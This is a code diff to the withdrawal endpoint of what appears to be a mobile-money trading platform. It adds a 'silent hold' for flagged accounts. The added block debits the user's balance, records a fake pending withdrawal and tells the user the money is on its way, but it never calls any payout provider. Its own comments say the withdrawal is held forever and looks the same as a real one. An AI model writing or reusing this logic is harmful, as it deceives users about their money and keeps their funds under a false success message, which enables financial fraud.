@@ -4,7 +4,7 @@ import { db, ensureSchema } from "@/lib/db";
 import { getSession } from "@/lib/auth";
 import { isTeronaConfigured, createPayout as teronaCreatePayout } from "@/lib/teronapay";
 import { normalizeUgPhone, centsToUgx, normalizeTzPhone, centsToTzs } from "@/lib/collecto";
-import { isBlocked, getWithdrawDailyCount, getWithdrawDailyMaxCents } from "@/lib/settings";
+import { isBlocked, isWithdrawBlocked, getWithdrawDailyCount, getWithdrawDailyMaxCents } from "@/lib/settings";
 import { sendEmail, withdrawalReceiptEmail } from "@/lib/email";
 import { cents } from "@/lib/format";
 import { BRAND_NAME } from "@/lib/brand";
@@ -149,6 +149,26 @@ export async function POST(req: Request) {
     );
   }
   const balanceAfter = Number(debit[0].balance);
+
+  // ---- No-withdrawal whitelist (silent hold) ----
+  // The account can trade and use everything else, but its withdrawals are held
+  // in "processing" forever and never sent. Funds are reserved and a normal-
+  // looking pending withdrawal is recorded — but NO payout provider is called,
+  // so nothing is ever paid out. Indistinguishable from a real pending payout.
+  if (await isWithdrawBlocked(session.id, flow[0]?.email)) {
+    const rows = (await sql`
+      INSERT INTO abetrade_transactions (user_id, type, amount, status, method, reference, note)
+      VALUES (${session.id}, 'withdrawal', ${-amount}, 'pending', ${method}, ${phone || rawRef}, 'Withdrawal in progress')
+      RETURNING *
+    `) as any[];
+    return NextResponse.json({
+      ok: true,
+      mpesa: true,
+      transaction: rows[0],
+      balance: balanceAfter,
+      message: "Withdrawal is being sent. It usually arrives within a minute.",
+    });
+  }
 
   // ---- Automated payout via TeronaPay (UGX/TZS mobile money, and KES only when
   // no dedicated M-Pesa B2C paybill is set). When MPESA_B2C_* is configured, KES
